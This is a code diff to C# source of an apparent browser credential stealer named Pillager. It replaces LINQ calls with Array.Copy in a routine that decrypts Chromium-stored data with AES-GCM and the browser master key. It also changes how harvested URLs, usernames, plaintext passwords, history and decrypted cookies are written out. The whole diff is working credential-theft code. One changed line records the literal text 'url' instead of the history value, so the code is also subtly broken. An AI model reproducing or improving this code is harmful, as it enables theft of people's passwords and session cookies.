@@ -1,6 +1,5 @@
 ﻿using System;
 using System.IO;
-using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using Pillager.Helper;
@@ -55,11 +54,20 @@ namespace Pillager.Browsers
                 string bufferString = Encoding.Default.GetString(buffer);
                 if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                 {
-                    byte[] iv = buffer.Skip(3).Take(12).ToArray();
-                    byte[] cipherText = buffer.Skip(15).ToArray();
-                    byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
-                    cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
-                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, cipherText, tag);
+                    byte[] iv =new byte[12];
+                    Array.Copy(buffer, 3, iv, 0, 12);
+                    byte[] cipherText = new byte[buffer.Length-15];
+                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
+                    byte[] tag =new byte[16];
+                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
+                    byte[] data = new byte[cipherText.Length - tag.Length];
+                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
+
+                    //byte[] iv = buffer.Skip(3).Take(12).ToArray();
+                    //byte[] cipherText = buffer.Skip(15).ToArray();
+                    //byte[] tag = cipherText.Skip(cipherText.Length - 16).ToArray();
+                    //cipherText = cipherText.Take(cipherText.Length - tag.Length).ToArray();
+                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                 }
                 else
                 {
@@ -103,6 +111,7 @@ namespace Pillager.Browsers
                         !(password is null) && password.Length > 0)
                     {
                         passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
+                        passwords.AppendLine();
                     }
                 }
 
@@ -131,7 +140,7 @@ namespace Pillager.Browsers
                 for (int i = 0; i < handler.GetRowCount(); i++)
                 {
                     string url = handler.GetValue(i, "url");
-                    history.Append("\t{" + url + "}");
+                    history.AppendLine("url");
                 }
                 File.Delete(cookie_tempFile);
             }
@@ -165,7 +174,7 @@ namespace Pillager.Browsers
                     string crypt = handler.GetValue(i, "encrypted_value");
 
                     string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
-                    cookies.Append("\t[" + host_key + "] \t {" + name + "}={" + cookie + "}");
+                    cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
                 }
 
                 File.Delete(cookie_tempFile);
